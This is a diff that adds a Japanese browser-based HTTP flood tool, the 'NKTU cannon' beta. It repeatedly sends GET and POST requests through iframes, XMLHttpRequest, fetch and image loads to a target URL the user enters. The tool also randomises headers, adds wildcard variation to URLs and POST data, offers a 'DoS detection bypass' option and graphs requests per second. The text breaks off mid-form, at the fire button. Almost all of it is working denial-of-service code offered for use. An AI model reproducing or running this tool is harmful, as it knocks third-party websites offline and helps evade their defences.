@@ -1,12 +1,1378 @@
-<!DOCTYPE html>
-<html lang="ja">
-<head>
-  <meta charset="UTF-8">
-  <title>IP情報送信テスト</title>
-</head>
-<body>
-  <h1>IP情報を取得してDiscordに送信します</h1>
-  <p id="status">取得中...</p>
+<html>
+    <head>
+        <meta http-equiv="content-type" charset="UTF-8">
+        <meta http-equiv="content-style-type" content="text/css">
+        <title>【NKTU】神風真雷NKTU砲・β版</title>
+
+        <script type="text/javascript" src="smoothie.js"></script>
+<body style="background-color:red;">
+        <script>
+
+        var m_toDoing, m_stBomburl, attackmode, IsUrlVaild, IsPostdataVaild, IsRandH, RandH, IsBypassDos, BypassDos, Nowdate, rps, Nowdate2, i, iwc, wch, wch_url, URL, POSTDATA, MODE, mode, imgurl;
+	    var m_inInterval = 0, tln1=0, tln1_url=0, m_inCount = 0, m_inCount = 0;
+	    var m_ifFrame = new Array();
+	    var method="POST";
+	    var method2="GET";
+	    var async="true"
+	    var xhr = new XMLHttpRequest();
+	    var xhr2 = new XMLHttpRequest();
+	    var count = "15";
+	    var lang = "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7";
+        var Langs = ['af,en-US;q=0.8,en;q=0.7','ar-sa,en-US;q=0.8,en;q=0.7','As,en-US;q=0.8,en;q=0.7','az-Latn,en-US;q=0.8,en;q=0.7','be,en-US;q=0.8,en;q=0.7','ca-ES-valencia,en-US;q=0.8,en;q=0.7','de-de,en-US;q=0.8,en;q=0.7','fil-Latn,en-US;q=0.8,en;q=0.7','fr-FR,en-US;q=0.8,en;q=0.7','et,en-US;q=0.8,en;q=0.7','eu,en-US;q=0.8,en;q=0.7','el,en-US;q=0.8,en;q=0.7','es-ES,en-US;q=0.8,en;q=0.7','ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7','en-US;q=0.9,en;q=0.8'];
+	    var contype = "application/x-www-form-urlencoded";
+        var Contypes = ['text/plain','text/html','application/json','application/x-www-form-urlencoded'];
+	    var accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+        var Accepts = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html, application/xhtml+xml, image/jxr, */*','text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1'];
+	    var ifmoded = "Thu, 01 Jun 1970 00:00:00 GMT";
+        var BDnum = 60
+        const randRange = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);
+        const my_sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+        // ワイルドカード設定
+        var randomCards0="*,$,@,+,<,>,!,(,)".split(",");
+        var string0="0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z".split(",");
+        var string1=new Array();
+        var alphabet0=new Array();
+        var alphabet1=new Array();
+        var alphabet2=new Array();
+        var number0=new Array();
+        var number1=new Array();
+        var number2=new Array();
+
+        for(i=0;i<52;++i){
+        	alphabet0[i]=string0[i+10];
+        }
+        for(i=0;i<26;++i){
+        	alphabet1[i]=string0[i+10];
+        	alphabet2[i]=string0[i+36];
+        }
+        for(i=0;i<10;++i){
+        	string1[i]=string0[i];
+        	number0[i]=string0[i];
+        	number1[i]=string0[i];
+        	number2[i]=string0[i];
+        }
+        for(i=10;i<16;++i){
+        	number1[i]=string0[i];
+        	number2[i]=string0[i+26];
+        }
+        for(i=10;i<36;++i){
+        	string1[i]=string0[i+26];
+        }
+        // ここまで--------------------------------------
+        //convurl_postデータ用(boonv3.7から流用)---------------------------------------------
+        function convurl(pss){
+    	 if(pss==1){
+    		if(tln1 >= tl.length){
+    			tln1=0;
+    		}
+    		if(wch==1){
+    			urlconv1=randomString1(tl[tln1]);
+    		}else{
+    			urlconv1=tl[tln1];
+    		}
+    		++tln1;
+    		return urlconv1;
+
+    	}else{					// urlconv(1)の1を忘れても一応動くようにする。スクリプト拡張用補助。
+    		if(tln1 >= tl.length){
+    			tln1=0;
+    		}
+    		if(wch==1){
+    			urlconv1=randomString1(tl[tln1]);
+    		}else{
+    			urlconv1=tl[tln1]
+    		}
+    		++tln1;
+    		return urlconv1;
+    	}
+}
+
+//ここまで---------------------------------------------------------
+
+//convurl_URLデータ用(boonv3.7から流用)---------------------------------------------
+
+function convurl_url(pss_url){
+	  if(pss_url==1){
+		if(tln1_url >= tl_url.length){
+			tln1_url=0;
+		}
+		if(wch_url==1){
+			urlconv1_url=randomString1(tl_url[tln1_url]);
+		}else{
+			urlconv1_url=tl_url[tln1_url];
+		}
+		++tln1_url;
+		return urlconv1_url;
+	}else{					// urlconv(1)の1を忘れても一応動くようにする。スクリプト拡張用補助。
+		if(tln1_url >= tl_url.length){
+			tln1_url=0;
+		}
+		if(wch_url==1){
+			urlconv1_url=randomString1(tl_url[tln1_url]);
+		}else{
+			urlconv1_url=tl_url[tln1_url]
+		}
+		++tln1_url;
+		return urlconv1_url;
+	}
+}
+
+//ここまで---------------------------------------------------------
+// ワイルドカード部分(boonv3.7から流用)-(URL/POSTDATA共用)------------------------------------------------
+// IMG砲1.0を(勝手に)改造。
+
+function randomString1(original){
+	var char1="",original2="";
+	var original1=original.replace(/\[(\d+)-(\d+)\]/g,convurlrandom);
+	var length1=original1.length;
+	for(iwc=0;iwc<length1;++iwc){
+		char1 = original1.charAt(iwc);
+		if(char1=="\\"){
+			ctmp=original1.charAt(iwc+1);
+			original2 +=ctmp;
+			++iwc;		//次の文字を無視
+		}else{
+			if(char1==randomCards0[0]) char1=string0[random1(62)];
+			if(char1==randomCards0[1]) char1=alphabet0[random1(52)];
+			if(char1==randomCards0[2]) char1=string0[random1(36)];
+			if(char1==randomCards0[3]) char1=string1[random1(36)];
+			if(char1==randomCards0[4]) char1=alphabet1[random1(26)];
+			if(char1==randomCards0[5]) char1=alphabet2[random1(26)];
+			if(char1==randomCards0[6]) char1=number0[random1(10)];
+			if(char1==randomCards0[7]) char1=number1[random1(16)];
+			if(char1==randomCards0[8]) char1=number2[random1(16)];
+			original2 +=char1;
+		}
+	}
+	return original2;
+}
+
+function random1(len1){
+	if(!(0<len1)) len1=10;
+	return Math.floor(Math.random()*len1)% len1;
+}
+
+function convurlrandom(sbody,rndtmp1,rndtmp2){
+	return Math.floor(Math.random()*(Number(rndtmp2)-Number(rndtmp1)+1))+Number(rndtmp1);
+}
+
+//ここまで-----------------------------------------------------
+
+function wildcard_detect(postdata_from_user, m_stBomburl) {
+		//wildcard処理(POSTデータ)---------------------------------
+		if(document.m_form1.wcc.checked) {
+			wch=1;
+		} else {
+			wch=0;
+		}
+		var tlt=postdata_from_user.split(/\r\n|\r|\n/);
+		tl = new Array;
+		for(tlc=0;tlc<tlt.length;tlc++){
+				if(tlt[tlc]=="" || tlt[tlc].match(/^\s|^\r/)){}	// 正直適当だったりする。
+				else{
+					tl.push(tlt[tlc]);
+				}
+        }
+        if(tl.length > 0) {
+        	IsPostdataVaild = 1
+        } else {
+        	alert("[エラー] POSTデータを入力してください。")
+        	IsPostdataVaild = 0
+        }
+    		//ここまで--------------------------------------
+    		//wildcardの処理(対象URL)-----------------------------------
+    		if(document.m_form1.wcc_url.checked) {
+    			wch_url=1
+    		} else {
+    			wch_url=0
+    		}
+    		var tlt_url=m_stBomburl.split(/\r\n|\r|\n/);
+    		tl_url = new Array;
+    		for(tlc_url=0;tlc_url<tlt_url.length;tlc_url++){
+    				if(tlt_url[tlc_url]=="" || tlt_url[tlc_url].match(/^\s|^\r/)){}	// 正直適当だったりする。
+	    			else{
+	    				tl_url.push(tlt_url[tlc_url]);
+	    			}
+	    		}
+	    		if(tl_url.length > 0) {
+	    			IsUrlVaild = 1
+	    		} else {
+	    			alert("[エラー] 対象URLを入力してください。")
+        		IsUrlVaild = 0
+	    		}
+	    	//ここまで---------------------------------------------------
+            RandH = document.getElementById('RandomHeaders');
+            if (RandH.checked) { 
+                IsRandH = 1;
+            } else {
+                IsRandH = 0;
+            } 
+            BypassDos = document.getElementById('BypassDosDetection');
+            if (BypassDos.checked) {
+                IsBypassDos = 1;
+            } else {
+                IsBypassDos = 0;
+            }
+	    	return [wch, wch_url, tl, tl_url, IsUrlVaild, IsPostdataVaild]
+	    }
+
+//UrlGenerator-----------------------------------------------------------
+
+function UrlGenerator() {
+    if (wch_url==1) {
+       URL = convurl_url(1);
+       return [URL]
+    } else {
+        URL = m_stBomburl
+        return [URL]
+    }
+}
+
+function PostDataGenerator() {
+    if (wch==1) {
+        POSTDATA = convurl(1);
+        return [POSTDATA]
+    } else {
+        POSTDATA = postdata_from_user;
+        return [POSTDATA]
+    }
+}
+
+function HeaderInfoGenerator() {
+    if (IsRandH==1) {
+        contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+        lang = Langs[Math.floor(Math.random() * Langs.length)];
+        accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+    } else {}
+}
+
+function sleep(waitMsec) {
+  var startMsec = new Date();
+  while (new Date() - startMsec < waitMsec);
+}
+
+
+
+async function RequestGenerator(mode) {
+  //BypassDos用の遅延処理
+  if (IsBypassDos==1) {
+        sleep(randRange(10, 300));
+        //await my_sleep(randRange(10, 300))
+        //console.log("IsBypassDos is " + IsBypassDos + "遅延処理" + "SLEEP");
+    } else {}
+
+    if (mode==1) {
+        m_ifFrame[i].setAttribute("src", URL);
+        //fech POST (こっそり)
+			var req2 = new Request(URL, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((POSTDATA))});
+			fetch(req2);
+    } else if (mode==2) {
+        m_ifFrame[i].setAttribute("src", URL);
+        //fetch GET (こっそり)
+			var req = new Request(URL, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+    } else if (mode==4) {
+        //XMLHttpRequest
+			xhr2.open(method2, URL, async);
+	  	    xhr2.setRequestHeader("Pragma", "no-cache");
+ 			xhr2.setRequestHeader("Cache-Control", "no-store");
+ 			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
+			xhr2.setRequestHeader("Accept-Language", lang);
+			xhr2.setRequestHeader("Accept", accept);
+			xhr2.setRequestHeader("Content-Type", contype);
+ 			xhr2.send();
+            xhr.open(method, URL, async);
+			xhr.setRequestHeader("Content-Type", contype);
+			xhr.send(POSTDATA);
+    } else if (mode==5) {
+      xhr2.open(method2, URL, async);
+	  	xhr2.setRequestHeader("Pragma", "no-cache");
+ 			xhr2.setRequestHeader("Cache-Control", "no-store");
+ 			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
+			xhr2.setRequestHeader("Accept-Language", lang);
+			xhr2.setRequestHeader("Accept", accept);
+			xhr2.setRequestHeader("Content-Type", contype);
+ 			xhr2.send();
+    } else if (mode==6) {
+        xhr.open(method, URL, async);
+			xhr.setRequestHeader("Content-Type", contype);
+			xhr.send(POSTDATA);
+    } else if (mode==7) {
+             //fetch GET
+			var req = new Request(URL, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+			//fech POST
+			var req2 = new Request(URL, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((POSTDATA))});
+			fetch(req2);
+    } else if (mode==8) {
+            //fetch GET
+			var req = new Request(URL, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+    } else if (mode==9) {
+            //fech POST
+			var req2 = new Request(URL, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((POSTDATA))});
+			fetch(req2);
+    } else if (mode==10) {
+          //デバッグ
+          Nowdate = Date.now();
+
+          for (i=0; i<120; i++) {
+            //img bomb
+            UrlGenerator();
+            imgurl = URL + `?${(new Date).getTime()}`
+            var img = new Image();
+            img.src = imgurl
+            //デバッグ
+            //console.log( i + "回目のimg")
+            //sleep(randRange(300, 400));
+          }
+
+          Nowdate2 = Date.now();
+          rps = 130 / (Nowdate2 - Nowdate) * 1000;
+          await my_sleep(randRange(610, 900));
+
+
+    } else if (mode==11) {
+      //for (i=0; i<2; i++) {
+        UrlGenerator();
+        var pic = new Image();
+        var rand = Math.floor(Math.random() * 1000)
+        pic.src = URL+'/?'+rand+'=val'
+        UrlGenerator();
+        var pic = new Image();
+        var rand = Math.floor(Math.random() * 1000)
+        pic.src = URL+'/?'+rand+'=val'
+
+      //}
+      //await my_sleep(randRange(610, 900));
+
+    } else {
+        //もしもの時のため
+        alert("[エラー] modeの値は" + mode + "です。これは不正な値です。")
+    }
+}
+
+function modeselect() {
+    mode = MODE;
+    UrlGenerator();
+    PostDataGenerator();
+    HeaderInfoGenerator();
+    Nowdate = Date.now();
+    for(i = 0; i < m_inWinNum; i++) {
+      RequestGenerator(mode);
+      if (MODE==10) {
+      //console.log("sleep at mode10")
+      //sleep(randRange(610, 900));
+      
+    } else {}
+
+    }
+    bombCounter();
+    Nowdate2 = Date.now();
+    rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
+	  m_toDoing = setTimeout("modeselect()", m_inInterval);
+    
+}
+
+//main-------------------------------------------------------------------
+function main()
+	{
+		m_inInterval = document.m_form1.m_tbInterval.value;
+		m_inWinNum = document.m_form1.m_tbWinNum.value;
+		m_stBomburl = document.m_form1.m_tbUrl.value;
+		postdata_from_user = document.m_form1.postdata_from_user.value;
+		http_method = document.m_form1.SELECT.value;
+		m_inCount = 0;
+		wildcard_detect(postdata_from_user, m_stBomburl);
+		if(IsUrlVaild==0 || IsPostdataVaild==0) {
+			return false;
+		} else {
+			
+		}
+		for(i = 0; i < m_ifFrame.length; i++)
+		{
+			try
+			{
+				document.all.m_dvMado.removeChild(m_ifFrame[i]);
+			}
+			catch(e){}
+		}
+
+		if(m_stBomburl[i] == "")
+		{
+			//空
+		}
+		else if(m_inInterval < 2)
+		{
+			alert("更新間隔が短すぎます。");
+		}
+		else
+		{
+			for(i = 0; i < m_inWinNum; i++)
+			{
+				m_ifFrame[i] = document.createElement('iframe');
+				m_ifFrame[i].setAttribute("id", "frame" + i);
+				m_ifFrame[i].setAttribute("height", "120");
+				m_ifFrame[i].setAttribute("width", "640");
+				document.all.m_dvMado.appendChild(m_ifFrame[i]);
+			}
+			if(http_method==1) {
+				attackmode="HTTP_GET/POST"
+                MODE = 1;
+				modeselect(1);
+			} else if(http_method==2) {
+				attackmode="HTTP_GET"
+                MODE = 2;
+				modeselect(2);
+			} else if(http_method==3) {
+                MODE = 3;
+				alert("[エラー] 従来のiFrame型田代はHTTP_POST ONLYモードに対応していません。");
+			} else {
+				alert("[エラー] 使用するHttp Requestの種類を選択してください。");
+			}
+		}
+	}
+
+    function main_XML()
+	{
+		m_inInterval = document.m_form1.m_tbInterval.value;
+		m_inWinNum = document.m_form1.m_tbWinNum.value;
+		m_stBomburl = document.m_form1.m_tbUrl.value;
+		postdata_from_user = document.m_form1.postdata_from_user.value;
+		http_method = document.m_form1.SELECT.value;
+		m_inCount = 0;
+		wildcard_detect(postdata_from_user, m_stBomburl);
+		if(IsUrlVaild==0 || IsPostdataVaild==0) {
+			return false;
+		} else {
+			
+		}
+		if(http_method==1) {
+			attackmode="HTTP_GET/POST"
+            MODE = 4;
+			modeselect(4);
+		} else if(http_method==2) {
+			attackmode="HTTP_GET"
+            MODE = 5;
+			modeselect(5);
+		} else if(http_method==3) {
+			attackmode="HTTP_POST"
+            MODE = 6;
+			modeselect(6);
+		} else {
+			alert("[エラー] 使用するHttp Requestの種類を選択してください。");
+		}
+	}
+
+    function main_fetch()
+	{
+		m_inInterval = document.m_form1.m_tbInterval.value;
+		m_inWinNum = document.m_form1.m_tbWinNum.value;
+		m_stBomburl = document.m_form1.m_tbUrl.value;
+		postdata_from_user = document.m_form1.postdata_from_user.value;
+		http_method = document.m_form1.SELECT.value;
+		m_inCount = 0;
+		wildcard_detect(postdata_from_user, m_stBomburl);
+		if(IsUrlVaild==0 || IsPostdataVaild==0) {
+			return false;
+		} else {
+			
+		}
+		if(http_method==1) {
+			attackmode="HTTP_GET/POST"
+            MODE = 7;
+			modeselect(7);
+		} else if(http_method==2) {
+			attackmode="HTTP_GET"
+            MODE = 8;
+			modeselect(8);
+		} else if(http_method==3) {
+			attackmode="HTTP_POST"
+            MODE = 9;
+			modeselect(9);
+		} else {
+			alert("[エラー] 使用するHttp Requestの種類を選択してください。");
+		}
+		
+	}
+  
+function main_img() {
+    m_inInterval = document.m_form1.m_tbInterval.value;
+		m_inWinNum = document.m_form1.m_tbWinNum.value;
+		m_stBomburl = document.m_form1.m_imgUrl.value;
+		postdata_from_user = document.m_form1.postdata_from_user.value;
+		http_method = document.m_form1.SELECT.value;
+		m_inCount = 0;
+    wildcard_detect(postdata_from_user, m_stBomburl);
+		if(IsUrlVaild==0 || IsPostdataVaild==0) {
+			return false;
+		} else {
+			
+		}
+			attackmode="Img_Bomb"
+      MODE = 10;
+			modeselect(10);
+
+}
+
+function main_mobile() {
+    m_inInterval = document.m_form1.m_tbInterval.value;
+		m_inWinNum = document.m_form1.m_tbWinNum.value;
+		m_stBomburl = document.m_form1.m_tbUrl.value;
+		postdata_from_user = document.m_form1.postdata_from_user.value;
+		http_method = document.m_form1.SELECT.value;
+		m_inCount = 0;
+    wildcard_detect(postdata_from_user, m_stBomburl);
+		if(IsUrlVaild==0 || IsPostdataVaild==0) {
+			return false;
+		} else {
+			
+		}
+			attackmode="ImgBomb_mobile"
+      MODE = 11;
+			modeselect(11);
+}
+
+</script>
+
+<script>
+
+/*
+  async function stopBomb_fetch() {
+		rps = 0;
+		for(i = 0; i < count; i++) {
+			clearTimeout(m_toDoing_fetch);
+		}
+		document.all.m_taInfo.value += "\n\n";
+		document.all.m_taInfo.value += "～開始3(fetch)での訪問を中止しました～";
+	}
+
+	async function stopBomb_XML() {
+		rps = 0;
+		for(i = 0; i < count; i++) {
+			clearTimeout(m_toDoing_XML);
+		}
+		document.all.m_taInfo.value += "\n\n";
+		document.all.m_taInfo.value += "～開始2(XML)での訪問を中止しました～";
+	}
+*/
+
+async function stopBomb_normal() {
+		rps = 0;
+		for(i = 0; i < count; i++) {
+			clearTimeout(m_toDoing);
+		}
+		document.all.m_taInfo.value += "\n\n";
+		document.all.m_taInfo.value += "*攻撃を停止しました";
+	}
+
+function bombCounter() {
+		var stInfoTmp;
+		m_inCount++;
+		stInfoTmp = "～訪問しています～\n";
+		stInfoTmp += "モード  :" + attackmode + "\n";
+		stInfoTmp += "対象URL: " + convurl_url(1) + "\n";
+		stInfoTmp += "POSTDATA: " + convurl(1) + "\n";
+		stInfoTmp += "回数　：" + m_inCount + "回\n";
+		stInfoTmp += "速度　：" + m_inInterval + "ms\n";
+		stInfoTmp += "砲門数：" + m_inWinNum + "門";
+		document.all.m_taInfo.value = stInfoTmp;
+	}
+
+function PostDataField_disabler(ischecked) {
+		if(ischecked==true) {
+			document.getElementById("input_post").disabled = false;
+		} else {
+			document.getElementById("input_post").disabled = false;
+		}
+	}
+
+function PostDataField_disabler2(ischecked) {
+		if(ischecked==true) {
+			document.getElementById("input_post").disabled = true;
+		} else {
+			document.getElementById("input_post").disabled = false;
+		}
+	}
+
+function LogClear() {
+		var elem = document.getElementById("m_taInfo");
+		elem.innerText="";
+		document.all.m_taInfo.value="";
+		document.all.m_taInfo.value += "※ここに情報が表示されます。";
+	}
+        </script>
+        
+        <script>
+            function graphLoad() {
+	            var smoothie = new SmoothieChart({
+	            grid: { strokeStyle:'rgb(125, 0, 0)', fillStyle:'rgb(60, 0, 0)',
+			    lineWidth: 1, millisPerLine: 250, verticalSections: 6, },
+	            labels: { fillStyle:'rgb(60, 0, 0)' }
+                 });
+	            smoothie.streamTo(document.getElementById("mycanvas"));
+	            // Data
+	            var line1 = new TimeSeries();
+	            //var line2 = new TimeSeries();
+	
+	            // Add a random value to each line every second
+	            setInterval(function() {
+	              line1.append(Date.now(), rps);
+	             // line2.append(Date.now(), Math.random());
+	            }, 1000);
+	
+	            // Add to SmoothieChart
+	            smoothie.addTimeSeries(line1,
+	            { strokeStyle:'rgb(0, 255, 0)', fillStyle:'rgba(0, 255, 0, 0.4)', lineWidth:3 });
+	            //smoothie.addTimeSeries(line2, { strokeStyle:'rgb(255, 0, 255)', fillStyle:'rgba(255, 0, 255, 0.3)', lineWidth:3 });
+	            smoothie.streamTo(document.getElementById("mycanvas"), 1000 /*delay*/); 
+  
+                }
+        </script>
+
+    </head>
+
+<style>
+        .scroll2{
+  overflow: auto;
+  white-space: pre;
+  width: 700;
+  border: solid;
+  border-radius: 8px; 
+  color: white;
+  background-color: #000000;
+  text-align: center;
+  border-color: cyan;
+}
+.css-button-rounded--black {
+  min-width: 200px;
+  color: lime;
+  padding: 5px 10px;
+  font-weight: bold;
+  height: 70px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  position: relative;
+  display: inline-block;
+  outline: none;
+  border-radius: 5px;
+  border: 2px solid #212529;
+  background: #212529;
+  border-color: cyan;
+  font-size: 25;
+}
+.css-button-rounded--black:hover {
+  background: #fff;
+  color: #212529
+}
+.backgroundcolor {
+ background-image: url(kabegami.png);
+ background-attachment: fixed;
+ color: white;
+ width:100%;
+	height:700px;
+	position:relative;
+}
+
+canvas{
+	
+	position:fixed;/*親のブロックを基準にして相対位置に配置する*/
+	/*位置指定*/
+	z-index:-1;/*重ね順を-1に　※1以上だとほかのコンテンツの上に被さってしまいます*/
+	display: block;
+  	width: 100%;
+  	height: 100%;
+  	margin: 0;
+  	padding: 0;
+}
+
+
+summary {
+  /* display: list-item;以外を指定してデフォルトの三角形アイコンを消します */
+  display: block;
+  font-size: 35;
+}
+
+summary::-webkit-details-marker {
+  /* Safariで表示されるデフォルトの三角形アイコンを消します */
+  display: none;
+}
+
+.summary_inner{
+  cursor: pointer;
+  display: flex;
+  flex-direction: row;
+  justify-content: space-between;
+  align-items: center;
+  padding: 16px 24px;
+  border: 1px solid #d2beff;
+  font-weight: bold;
+  color: cyan;
+  background-color: black;
+}
+
+/* --------アイコンを作ります-------- */
+.icon {
+  display: block;
+  position: relative;
+  width: 24px;
+  margin-left: 6px;
+  flex-shrink: 0;
+  transform-origin: center 43%;
+  transition: transform 0.4s;
+}
+
+/* アコーディオンが開いた時のスタイル */
+details[open] .icon {
+  transform: rotate(180deg);
+}
+
+/* アイコンのバーのスタイル */
+.icon::before,
+.icon::after {
+  content: "";
+  position: absolute;
+  display: block;
+  width: 15px;
+  height: 3px;
+  background-color: green;
+}
+
+.icon::before {
+  left: 0;
+  transform: rotate(45deg);
+}
+
+.icon::after {
+  right: 0;
+  transform: rotate(-45deg);
+}
+
+/* --------summaryタグの疑似要素でアイコンを作る場合-------- */
+.wrapper_pseudoElementsIcon .summary_inner::after {
+  content: "";
+  display: block;
+  width: 25px;
+  height: 16px;
+  margin-left: 6px;
+  flex-shrink: 0;
+  background-image: url("icon.svg");
+  background-size: contain;
+  background-repeat: no-repeat;
+  background-position: center;
+  transform-origin: center 43%;
+  /* アコーディオンが閉じる時にアイコンをアニメーションさせます */
+  animation: 0.4s close-animation;
+}
+
+@keyframes close-animation {
+  from {
+    transform: rotate(180deg);
+  }
+
+  to {
+    transform: rotate(0deg);
+  }
+}
+
+/* アコーディオンが開いた時にアイコンをアニメーションさせます */
+details[open] .summary_inner::after {
+  animation: 0.4s open-animation forwards;
+}
+
+@keyframes open-animation {
+  from {
+    transform: rotate(0deg);
+  }
+
+  to{
+    transform: rotate(180deg);
+  }
+}
+
+/* --------アコーディオンの中身のスタイル-------- */
+.content {
+  background-color: black;
+  padding: 24px 48px;
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+  font-size: 35;
+  color: greenyellow;
+}
+
+/* --------レイアウト用のスタイル-------- */
+.wrapper {
+  display: flex;
+  margin: 0 auto;
+}
+
+.wrapper details {
+  margin-bottom: 10px;
+}
+
+.wrapper details:last-child {
+  margin-bottom: 0;
+}
+
+.wrapper_normalIcon, .wrapper_pseudoElementsIcon {
+  width: 900px;
+  display: flex;
+  flex-direction: column;
+}
+
+@media (min-width: 1071px) {
+  .wrapper_normalIcon {
+    margin-right: 24px;
+  }
+}
+
+@media (max-width: 1070px) {
+  .wrapper {
+    flex-direction: column;
+  }
+
+  .wrapper_normalIcon {
+    margin-bottom: 24px;
+  }
+}
+
+@media (max-width: 760px) {
+  .wrapper_normalIcon, .wrapper_pseudoElementsIcon {
+    width: 100%;
+  }
+}
+
+.wrapper_title {
+  font-size: 30px;
+}
+
+.toggle_input {
+  position: absolute;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 5;
+  opacity: 0;
+  cursor: pointer;
+}
+
+.toggle_label {
+  width: 45px;
+  height: 21px;
+  background: #ccc;
+  position: relative;
+  display: inline-block;
+  border-radius: 40px;
+  transition: 0.4s;
+  box-sizing: border-box;
+}
+
+.toggle_label:after {
+  content: "";
+  position: absolute;
+  width: 20px;
+  height: 20px;
+  border-radius: 100%;
+  left: 0;
+  top: 0;
+  z-index: 2;
+  background: #fff;
+  box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+  transition: 0.4s;
+}
+
+.toggle_input:checked + .toggle_label {
+  background-color: #4BD865;
+}
+
+.toggle_input:checked + .toggle_label:after {
+  left: 24px;
+}
+
+.toggle_button {
+  position: relative;
+  width: 45px;
+  height: 21px;
+  margin: auto;
+}
+
+    </style>
+
+    <body  class="backgroundcolor"  style="font-size: 35;">
+        <h1>神風真雷NKTU砲 Beta版</h1>
+        <b>[2024.04.15版]</b>
+        <br>
+        <br>
+        本ツールは開発中なので性能はまあ普通の田代砲より強いって感じです。自己責任でお願いします。
+        <br>
+     <div style="text-align: center; padding: 10px; margin-bottom: 10px; border: 5px double #333333; border-radius: 10px; font-size: 35; background-color: black; opacity: 0.74;">
+     <form name="m_form1">
+        <br>
+        <input type="checkbox" disabled>
+        <b>【使用するHttp Requestの種類を選択】</b>
+        <br>
+        <font color="red">※よく分からない場合はデフォルトを選択してください。</font>
+        <br>
+        <p>
+            <input type="radio" style="transform: scale(1.5);" id="GET&POST-MODE" name="SELECT" value="1" onclick="PostDataField_disabler(this.checked);">
+            <label for="inq1">GET/POST(デフォルト)</label>
+            <input type="radio" style="transform: scale(1.5);" id="GETONLY-MODE" name="SELECT" value="2" onclick="PostDataField_disabler2(this.checked);">
+            <label for="inq2">GETだけ</label>
+            <input type="radio" style="transform: scale(1.5);" id="POSTONLY-MODE" name="SELECT" value="3" onclick="PostDataField_disabler(this.checked);">
+            <label for="inq3">POSTだけ</label>
+        </p>
+        <input type="checkbox" disabled>
+        <label for="inq4">ランダムなヘッダー値を使用する<font color="red">(説明欄必読)</font></label>
+        <div class="toggle_button">
+            <input  id="RandomHeaders" class="toggle_input" type='checkbox'/>
+           <label for="toggle" class="toggle_label" />
+        </div>
+        <br>
+        <input type="checkbox" disabled>
+        <label for="inq4">Dos検知回避機能を使用する<mark><font color="red">[非推奨](説明欄必読)</font></mark></label>
+        <div class="toggle_button">
+            <input  id="BypassDosDetection" class="toggle_input" type='checkbox'/>
+           <label for="toggle2" class="toggle_label" />
+        </div>
+        <br>
+        <input type="checkbox" disabled>
+        URLでWildcardを使用する:
+        <div class="toggle_button">
+        <input type="checkbox" class="toggle_input" name="wcc_url" style="transform: scale(1.5);" title="チェックでワイルドカードを使用します。">
+        <label for="toggle2" class="toggle_label" />
+        </div>
+        <br>
+        <input type="checkbox" disabled>
+        PostDataでWildcardを使用する:
+        <div class="toggle_button">
+        <input type="checkbox" class="toggle_input" name="wcc" style="transform: scale(1.5);" title="チェックでワイルドカードを使用します。">
+        <label for="toggle2" class="toggle_label" />
+        </div>
+        <br>
+
+        <br>
+        <b>【対象URL】<font color="red">httpsサイトのみ</font></b>
+        <br>
+        <input class="css-button-rounded--black" type="text" name="m_tbUrl" size=55 placeholder="https://www.google.com">
+        <br>
+        <br>
+        <b>【imgボム用対象サイトの画像URL】<br> <font color="red">png,jpg,gif,webm等の拡張子</font></b>
+        <input class="css-button-rounded--black" type="text" name="m_imgUrl" size=55 placeholder="https://www.example.com/images/image.png">
+        <br>
+        <br>
+        <b>【POSTデータ】</b>
+        <br>
+        <input class="css-button-rounded--black" type="text" name="postdata_from_user" size="50" id="input_post" disabled="disabled" value="{'name':'nanashi', 'comment':'qawsedrftgyhujikolp'}">
+        <br>
+        <br>
+        <b>【更新間隔】単位はms</b>
+        <br>
+        <input class="css-button-rounded--black" type="text" size="10" name="m_tbInterval" value="120">
+        <br>
+        <br>
+        <b>【同時更新数】</b>
+        <br>
+        <input class="css-button-rounded--black" type="text" size="10" name="m_tbWinNum" value="15">
+        <br>
+        <br>
+        <b>[発射ボタン]</b>
+        <br>
